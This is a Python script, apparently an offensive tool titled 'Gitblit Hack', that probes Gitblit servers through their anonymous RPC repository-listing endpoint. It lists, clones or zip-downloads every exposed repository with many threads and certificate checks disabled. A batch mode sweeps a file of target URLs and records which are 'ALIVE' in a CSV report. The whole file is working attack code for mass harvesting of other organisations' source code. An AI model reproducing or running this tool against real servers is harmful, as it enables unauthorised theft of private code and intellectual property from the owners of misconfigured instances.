import os, requests, argparse, urllib3, subprocess, csv, re
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from tqdm import tqdm

# Suppress insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = r"""
  ____ _ _   _     _ _ _     _   _            _    
 / ___(_) |_| |__ | (_) |_  | | | | __ _  ___| | __
| |  _| | __| '_ \| | | __| | |_| |/ _` |/ __| |/ /
| |_| | | |_| |_) | | | |_  |  _  | (_| | (__|   < 
 \____|_|\__|_.__/|_|_|\__| |_| |_|\__,_|\___|_|\_\
                                                    
     [ Gitblit Exporter | @Author: Sublarge ]
"""

class Colors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

class GitblitMaster:
    def __init__(self, threads=10, limit_gb=1.0):
        self.threads = threads
        self.limit_bytes = limit_gb * 1024**3
        self.session = requests.Session()
        self.session.verify = False
        self.env = os.environ.copy()

    def _sanitize_path(self, path):
        """Removes/Replaces characters that are illegal in Windows/Linux filenames."""
        return re.sub(r'[<>:"/\\|?*]', '_', path)

    def _parse_size(self, size_str):
        if not size_str: return 0
        units = {"KB": 1024, "MB": 1024**2, "GB": 1024**3, "B": 1}
        try:
            parts = size_str.split()
            if len(parts) == 2:
                return float(parts[0]) * units.get(parts[1].upper(), 1)
        except (ValueError, IndexError):
            return 0
        return 0

    def get_info(self, url):
        url = url.strip().rstrip('/')
        if not url.startswith('http'): url = 'http://' + url
        try:
            # RPC call to list repositories
            rpc_url = f"{url}/rpc/?req=LIST_REPOSITORIES"
            resp = self.session.get(rpc_url, timeout=15)
            if resp.status_code == 200:
                return resp.json(), url
            return None, url
        except Exception:
            return None, url

    def clone_task(self, args):
        url, path = args
        local_dir = self._sanitize_path(path.replace('.git', ''))
        save_path = os.path.join("repos", local_dir)
        os.makedirs("repos", exist_ok=True)
        try:
            subprocess.run(
                ["git", "-c", "credential.helper=", "clone", f"{url}/r/{path}", save_path, "--quiet", "--depth", "1"],
                env=self.env, capture_output=True, timeout=300
            )
        except Exception:
            pass

    def zip_task(self, args):
        url, path = args
        local_file = self._sanitize_path(path.replace('.git', '')) + ".zip"
        os.makedirs("zips", exist_ok=True)
        try:
            r = self.session.get(f"{url}/zip/?r={path}&format=zip", stream=True, timeout=60)
            if r.status_code == 200:
                with open(os.path.join("zips", local_file), 'wb') as f:
                    for chunk in r.iter_content(chunk_size=32768):
                        if chunk: f.write(chunk)
        except Exception:
            pass

    def run_single(self, url, mode):
        data, clean_url = self.get_info(url)
        if not data:
            print(f"{Colors.RED}[!] Error: Target unreachable or Anonymous RPC disabled.{Colors.END}")
            return

        repos_meta = []
        total_bytes = 0
        for info in data.values():
            name = info.get('name', 'Unknown')
            size_str = info.get('size', '0 B')
            last_date = info.get('lastChange', 'Unknown').split('T')[0]
            author = info.get('lastChangeAuthor', 'N/A')
            total_bytes += self._parse_size(size_str)
            repos_meta.append((name, size_str, last_date, author))

        print(f"\n{Colors.BOLD}{Colors.BLUE}[Target Summary]{Colors.END}")
        print(f" Target: {clean_url}")
        print(f" Total Count: {len(repos_meta)} | Total Size: {total_bytes/1024**2:.2f} MB")
        print("-" * 95)
        print(f"{'Repository Name':<50} | {'Size':<10} | {'Last Date':<12} | {'Author'}")
        print("-" * 95)
        
        for name, size, date, auth in repos_meta:
            print(f" {Colors.GREEN}>{Colors.END} {name:<47} | {Colors.YELLOW}{size:<10}{Colors.END} | {date:<12} | {auth}")

        if mode in ['clone', 'zip']:
            if total_bytes > self.limit_bytes:
                print(f"\n{Colors.RED}[!] WARNING: Total size ({total_bytes/1024**3:.2f} GB) exceeds threshold!{Colors.END}")
                if input(f"{Colors.BOLD}Do you want to continue? (y/n): {Colors.END}").lower() != 'y': return
            
            task_func = self.clone_task if mode == 'clone' else self.zip_task
            print(f"\n{Colors.CYAN}[*] Starting concurrent {mode.upper()} ({self.threads} threads)...{Colors.END}")
            
            with ThreadPoolExecutor(max_workers=self.threads) as exe:
                list(tqdm(exe.map(task_func, [(clean_url, r[0]) for r in repos_meta]), 
                          total=len(repos_meta), desc=mode.upper(), unit="repo"))
            print(f"\n{Colors.GREEN}[+] Task finished. Results saved in ./{'repos' if mode=='clone' else 'zips'}{Colors.END}")

    def run_batch(self, file_path):
        if not os.path.exists(file_path):
            print(f"{Colors.RED}[!] File not found: {file_path}{Colors.END}")
            return
        
        with open(file_path, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        results = []
        print(f"\n{Colors.CYAN}[*] Batch Probing {len(urls)} targets...{Colors.END}")
        print(f"{'-'*100}")
        print(f"{'Target URL':<55} | {'Status':<10} | {'Repos':<6} | {'Size'}")
        print(f"{'-'*100}")

        for url in urls:
            data, clean_url = self.get_info(url)
            res = {"url": clean_url, "status": "DEAD", "count": 0, "size_mb": 0.0}
            if data:
                res["status"] = "ALIVE"
                res["count"] = len(data)
                res["size_mb"] = round(sum(self._parse_size(i.get('size')) for i in data.values()) / 1024**2, 2)
            
            color = Colors.GREEN if res['status'] == "ALIVE" else Colors.RED
            print(f"{res['url']:<55} | {color}{res['status']:<10}{Colors.END} | {res['count']:<6} | {res['size_mb']} MB")
            results.append(res)

        filename = f"scan_report_{datetime.now().strftime('%Y%m%d_%H%M')}.csv"
        try:
            with open(filename, 'w', newline='', encoding='utf-8-sig') as f:
                writer = csv.DictWriter(f, fieldnames=["url", "status", "count", "size_mb"])
                writer.writeheader()
                writer.writerows(results)
            print(f"\n{Colors.GREEN}[+] Batch scan completed. Report: {filename}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to save CSV: {e}{Colors.END}")

if __name__ == "__main__":
    print(Colors.CYAN + BANNER + Colors.END)
    parser = argparse.ArgumentParser(description="Gitblit Master Hardened - Built for efficiency.")
    parser.add_argument("-u", "--url", help="Single target URL")
    parser.add_argument("-f", "--file", help="File containing target URLs for batch scanning")
    parser.add_argument("-m", "--mode", choices=['clone', 'zip'], help="Action mode (None=List details)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-l", "--limit", type=float, default=1.0, help="Size limit (GB) before prompting")

    args = parser.parse_args()
    master = GitblitMaster(args.threads, args.limit)
    
    if args.file:
        master.run_batch(args.file)
    elif args.url:
        master.run_single(args.url, args.mode)
    else:
        parser.print_help()